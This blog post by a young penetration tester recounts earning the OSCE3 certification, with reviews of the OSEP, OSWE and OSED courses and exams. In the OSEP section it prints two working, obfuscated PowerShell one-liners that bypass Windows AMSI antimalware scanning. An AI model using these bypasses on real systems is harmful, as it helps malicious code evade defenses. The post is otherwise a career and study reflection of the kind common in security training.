---
title: "Achieving OSCE3 At 19 (Offensive Security)"
categories:
  - Certifications
---

![OSCE3](https://user-images.githubusercontent.com/85040841/235331462-6860b1e6-7afb-4e2f-aba2-53d24451b340.jpg)


I'm now the youngest Offensive Security Certified Expert 3 (OSCE3) holder in history after obtaining the highly coveted certification at the age of 19 on March 10, 2023.

Becoming an OSCE3 was no easy feat, and this achievement is a testament to my unwavering devotion to mastering this field. Although I am primarily a self-taught individual, I started my cybersecurity journey at Fullstack Academy in November of 2021, and it's nice to reflect on where I am now compared to then — I've gone from using Kali Linux for the first time back then to achieving expertise within this domain in a flash.

The OSCE3 is an advanced combination cert that is comprised of three certifications from OffSec: Offensive Security Experienced Penetration Tester (OSEP), Offensive Security Web Expert (OSWE), and Offensive Security Exploit Developer (OSED). Obtaining all of them and becoming an OSCE3 holder was a matter of passing three intense 48-hour proctored exams and submitting professional reports which followed strict guidelines and contained detailed outlines of my steps and custom code within 24 hours after each exam ended. I managed to pass each corresponding exam on my first try and earned all three certs within the span of about 40 days (immediately after completing OSWP, OSWA, and KLCP).

While the OSCP was a formidable entry-level certification for me to conquer last year, it is simply the tip of the iceberg when it comes to pentesting and mainly serves as a filter for HR. There is so much more to learn after PEN-200, and the OSCP shouldn't hold as much weight it does in the InfoSec community because of its sheer simplicity. Becoming an OSCE3 holder required a whole new level of dedication, focus, and persistence. OSCE3 is the only physical cert that OffSec still prints, and for a good reason — it signifies that an individual has an extremely high level of ambition, tenacity, and perspicacity.

The path of self-driven learning (autodidactism) and learning at a rapid pace is divine, which is part of the reason I enjoyed completing OffSec's courses so much. The concept of schooling and being taught what the government thinks I should learn while being limited by the same learning rate as strangers has never appealed to me (which explains my abysmal attendance rate). Autodidactism enables an individual to not be held back by others and to explore what interests them, which is right up my alley. In retrospect, I've always been destined to become a great hacker due to my love for technology and how much I enjoy solving problems. Additionally, despite the show being fictional, I was very inspired by Elliot from Mr. Robot and his hacking prowess after watching the series a couple of years ago.

Since I have insider knowledge that no teenager had become an OSCE3 holder until 3/10/2023, I'm officially the youngest individual to ever do it. Regarding cybersecurity, this is certainly my greatest achievement, although there are many more to come considering the fact that I have been a cybersecurity professional for less than a year. The journey to this point was stressful and challenging, to say the least, but all that matters to me is that I achieved this before my 20th birthday on April 2nd, as I promised myself when I started this journey last Winter.

Speed, efficiency, and a sense of urgency are paramount in every facet of my life because of how much I value time. Patience is not a virtue to me. Whatever my heart is committed to accomplishing is done before it is done. In other words, I was already an OSCE3 holder internally before I began studying since it was a genuine desire of mine. Therefore, the external steps were a mere formality.

Thank you to everyone from GuidePoint Security who made this possible and believed in me, and my peers and instructors from Fullstack Academy, who have always been supportive. I won't let the momentum I have built thus far go to waste — I have already moved on to my next goals.

I would also like to thank all of the despicable individuals and companies who have rejected me, ignored me, doubted me, and mistreated me. Throughout my life, many negative forces and circumstances have provided me with a consistent source of motivation since I was 9 years old. Nobody will ever understand the personal struggles I face every day that fuel my unmatched drive and ambition. This is only the beginning!

---

I will now provide quick summaries of my experiences with each of the three certs and corresponding courses that make up the OSCE3 certification. All of them were taken alongside my Learn Unlimited subscription.

## PEN-300: EVASION TECHNIQUES AND BREACHING DEFENSES (OSEP)

![OSEP](https://user-images.githubusercontent.com/85040841/235326344-ba19b14f-b3e9-4e86-a9f1-f0f69b4d833f.png)

The first cert I conquered for OSCE3 was the OSEP, which corresponds to OffSec's PEN-300 course. Out of the three certs that make up OSCE3, this one was the easiest for me when it comes to completing the material, as I was already quite well-versed in network pentesting, Active Directory (AD), lateral movement, and privilege escalation before starting as it is closely related to my current area of work.

### COURSE TAKEAWAY

The most interesting part of this course was the focus on evasion techniques. Easily bypassing application whitelisting and anti-virus (AV) software, e.g. Windows Defender, was not something I had been exposed to during my extensive studying on HTB Academy, TryHackMe, and even PEN-200. Therefore, learning about process hollowing and injection in C# and how to create Meterpreter payloads that utilized either of them alongside XOR encryption and sleep timers in order to bypass AV was a fun topic to learn about. While going through the course, I also came across two AMSI bypass one-liners that seemingly have a guaranteed success rate:

```ruby
# AMSI-Bypass #1:
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

# AMSI-Bypass #2:
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

Additionally, learning about client-side attacks and phishing via VBA macros was interesting. The chapters within PEN-300 seemed scattered, but they were packed with valuable info. For instance, after learning about post-exploitation you dive right into kiosk breakouts, and sooner than later, you start learning about DevOps exploitation, i.e. misconfigured Ansible and Artifactory instances. There isn’t any sense of flow tied to the course, but the chapters are packed with solid info.

### EXAM OVERVIEW

Completing every PEN-300 challenge prepared me quite well for the exam. I ended up obtaining enough points to pass via compromising enough machines as opposed to retrieving the elusive "secret.txt" file that was hidden somewhere on an in-scope target. Many hosts were dependent upon each other, meaning that obtaining root/admin access on one host often led to the discovery of info or creds that could be utilized to move laterally and get low-privileged access on another machine. My familiarity with BloodHound helped me discover various attack vectors that exploited AD-related misconfigurations. There appeared to be multiple paths available, so I never felt like I was looking for a needle in a haystack during the exam. Remaining calm and carefully analyzing the information in front of me was paramount. One of the best things about OffSec exams is that they're open-book. I referenced my notes multiple times in order to recall specific techniques and commands. Being permitted to do so is entirely realistic, as it's not like pentesters such as myself never look things up during a real-world engagement if necessary.

## WEB-300: ADVANCED WEB ATTACKS AND EXPLOITATION (OSWE)

![OSWE](https://user-images.githubusercontent.com/85040841/235326350-f5ecb3a1-aa71-4095-a085-035bc7a916fc.png)

The second cert I conquered for OSCE3 was the OSWE, which corresponds to WEB-300, a.k.a. AWAE. The course is all about white-box web app pentesting and automating exploitation via scripts. One thing to keep in mind while taking this course is that when it comes to white-box pentesting, everything you need is in front of you, and the solution is directly embedded in the heart of the problem.

### COURSE TAKEAWAY

AWAE incorporates Python2 in many areas and can seem outdated as it is the oldest course in the OSCE3 trio, but it's still a valuable course for amassing application security expertise. Completing OSWA/WEB-200 shortly before starting AWAE supported my process of assimilating topics such as weak cross-origin resource sharing, advanced XSS/SSRF/SQLi, type juggling, etc., as it provided the foundation I needed by beginning with black-box testing before diving into white-box analysis. The thing about analyzing code is that once you understand the fundamentals of programming and the OWASP Top 10 inside-out, it is easy to develop a methodology that you can use to identify vulnerabilities within practically any language.

### EXAM OVERVIEW

The OSWE exam involved analyzing the source code of two web applications, identifying and exploiting vulnerabilities to escalate privileges and subsequently obtain RCE, and automating the entire process via Python exploits. Understanding the course material thoroughly and completing most of the exercises was crucial because I was able to reuse some functions within the scripts I had previously written in order to develop custom exploits for the two web apps. Just like when I took my OSWA exam, the most challenging part about this particular exam was staying focused and not panicking when things weren't going well. Every OffSec exam I've taken has been a mental battle, but this one stands out.

## EXP-301: WINDOWS USER MODE EXPLOIT DEVELOPMENT (OSED)

![OSED](https://user-images.githubusercontent.com/85040841/235326357-23a22acd-bc6c-4d74-b48c-267353d26d69.png)

### COURSE TAKEAWAY

The final cert I needed to become an OSCE3 holder at 19 was the OSED. This one was daunting at first because after finishing EXP-100, I knew that EXP-301 would involve reverse engineering binaries in IDA Pro and dealing with low-level subjects, i.e. writing custom shellcode, exploiting format string specifiers, developing egghunters, understanding 32-bit memory registers, and building ROP chains to bypass Data Execution Prevention (DEP) with WriteProcessMemory, VirtualProtect, VirtualAlloc, etc. alongside address leaks to ultimately calculate a DLL's current base address by subtracting an offset in order to defeat ASLR.

![OSED Collage](https://user-images.githubusercontent.com/85040841/235287829-40cebeed-bf9d-4716-a1ff-98e98218ee53.png)

Completing EXP-100 immediately beforehand certainly helped in regard to becoming familiar with WinDBG and getting a custom dark theme from the course materials. Additionally, it was nice to get a refresher on assembly language. Once I started EXP-301, my worries suddenly dissipated as I was enamored with the process of exploit development and bypassing standard security controls. The only part that felt quite tedious about this course was reverse engineering binaries in IDA Pro. That was fine to me because that is precisely how reverse engineering is when analyzing real-world applications, if not worse! The shellcode creation chapter felt brief, so conducting additional research helped me prepare for the exam.

### EXAM OVERVIEW

The OSED exam involved three tasks, two of which were required to pass. Without giving a lot of details away, the two I completed pertained to custom shellcode creation via Keystone Engine and bypassing DEP. I recommend completing most of the extra mile exercises (except for Faronics, which is a painful reverse engineering exercise, unless you have a lot of time to spare.) More specifically, some of the fun extra miles that come to mind are CustomSvr01, DiskPulse, Knet, VulnApp1/2, and all of the SEH-based, egghunter-based, DEP-based, and shellcode-based extra miles. Creativity is required for building a solid ROP chain during the exam. You need to understand the nuances of various gadgets and how to adapt your exploit based on the binary's bad chars and the gadgets at your disposal. Additionally, the shellcode portion of the exam can be tackled by starting with the base template that is provided by the course, but you must understand the entire process of shellcode creation and how your shellcode operates from execution to termination. Explaining everything in detail, from finding the base address of kernel32.dll to the Win32 API arguments you end up using, is a strict requirement on the exam report.

## CONCLUSION

Overall, this was an insane goal to accomplish, and I’m glad that I got it done in such a short timeframe while I was still a teenager. The days upon days of nonstop studying and drinking cups of espresso and cans of orange yerba mate in order to maintain my focus levels is something that I won’t forget! But harnessing sheer obsession is something that I had done many times long before I even started working in cybersecurity. In fact, I feel strange when I’m NOT completely focused on something new. Pursuing something with all of my might and pushing my brain to the edge enables me to lose myself in the process of achievement, which admittedly provides a sense of bliss that is more satisfying than the achievement itself. As for what’s next, I have many more tasks to complete on my to-do list. One of my main life goals is to build a unicorn company in this field VERY soon and consequently establish financial freedom for myself. I wasn’t born to work for somebody else and die after living at a fraction of my potential, as working is against my fundamental nature. Still, I currently have a job out of necessity, like many others. I love learning. After amassing significant wealth within a couple of years, I will have the necessary resources to explore everything I’m wholeheartedly interested in, as I am a true Renaissance Man at heart.

![challenge_coin](https://user-images.githubusercontent.com/85040841/235285727-d16b461d-3110-49de-88b7-68bfb4befbe4.jpg)
